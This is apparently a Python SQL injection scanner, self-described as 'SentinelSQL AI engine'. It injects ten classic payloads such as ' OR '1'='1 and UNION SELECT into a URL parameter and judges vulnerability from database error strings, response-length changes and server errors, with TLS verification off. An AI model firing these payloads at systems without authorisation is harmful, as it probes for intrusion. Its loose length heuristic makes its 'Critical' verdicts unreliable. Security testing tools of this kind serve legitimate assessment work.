import requests
import urllib3
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed

# Suppress InsecureRequestWarning from urllib3 when using verify=False
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

REQUEST_TIMEOUT = 5  # seconds per payload request

# Top 10 most effective SQLi payloads — optimized for speed
SQL_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR 1=1--",
    '" OR "1"="1',
    "' UNION SELECT NULL--",
    "' AND 1=2--",
    "admin' --",
    "' OR 1=1#",
    "1' ORDER BY 1--",
    "' OR 'a'='a",
]

SQL_ERRORS = [
    # MySQL
    "sql syntax", "mysql_fetch", "Warning: mysql", "mysqli_fetch", "mysql_num_rows",
    # PostgreSQL
    "PostgreSQL", "pg_query", "pg_exec", "unterminated quoted string",
    # SQLite (used by OWASP Juice Shop)
    "sqlite3", "SQLITE_ERROR", "sqlite_error", "near \"",
    # Microsoft SQL Server
    "Microsoft OLE DB", "unclosed quotation mark", "mssql_query",
    # Oracle
    "ORA-01756", "ORA-00933", "oracle error",
    # Generic
    "syntax error", "SQLSTATE", "SQL error", "sql error",
    "JDBC", "database error", "db error",
    # ColdFusion / Java
    "SQLException", "java.sql",
    # Error indicators in JSON responses
    "SQLITE",
]

def extract_params(url):
    parsed = urlparse(url)
    return parse_qs(parsed.query)

def inject_payload(url, payload):
    if "=" not in url:
        return None
    base, value = url.split("=", 1)
    return f"{base}={value}{payload}"

def check_sql_error(response_text):
    for error in SQL_ERRORS:
        if error.lower() in response_text.lower():
            return True
    return False

def check_response_length(original, test):
    """Detect significant response length differences indicating SQL injection."""
    diff = abs(len(original) - len(test))
    return diff > 30  # Lowered threshold for better sensitivity on JSON APIs

def run_sqli_scan(url):
    findings = []
    logs = []

    logs.append("[INFO] Initializing SentinelSQL AI engine...")
    logs.append(f"[INFO] Targeting: {url}")

    try:
        logs.append("[INFO] Fetching original baseline response...")
        original = requests.get(url, timeout=REQUEST_TIMEOUT, verify=False).text
    except Exception as e:
        logs.append(f"[ERROR] Target unreachable: {str(e)}")
        return {
            "status": "Unreachable",
            "risk_level": "Error",
            "findings": findings,
            "details": logs
        }

    def test_payload(payload):
        """Test a single payload and return result tuple."""
        injected_url = inject_payload(url, payload)
        if not injected_url:
            return None
        try:
            r = requests.get(injected_url, timeout=REQUEST_TIMEOUT, verify=False)
            error_detected = check_sql_error(r.text)
            length_changed = check_response_length(original, r.text)
            status_anomaly = r.status_code >= 500  # Server errors often indicate SQLi

            return {
                "payload": payload,
                "url": injected_url,
                "vulnerable": error_detected or length_changed or status_anomaly
            }
        except Exception:
            return None

    # Run all payloads concurrently for speed
    logs.append(f"[INFO] Testing {len(SQL_PAYLOADS)} payloads concurrently...")
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(test_payload, p): p for p in SQL_PAYLOADS}
        for future in as_completed(futures):
            result = future.result()
            if result is None:
                continue
            logs.append(f"[SCANNING] Tested: {result['payload']}")
            if result["vulnerable"]:
                findings.append({"payload": result["payload"], "url": result["url"]})
                logs.append(f"[WARNING] Vulnerability detected with: {result['payload']}")

    if findings:
        logs.append("[SUCCESS] Analysis complete. Vulnerabilities found!")
        return {
            "status": "Vulnerable",
            "risk_level": "Critical",
            "findings": findings,
            "details": logs
        }
    else:
        logs.append("[SUCCESS] Analysis complete. Target appears secure.")
        return {
            "status": "Secure",
            "risk_level": "Low",
            "findings": [],
            "details": logs
        }
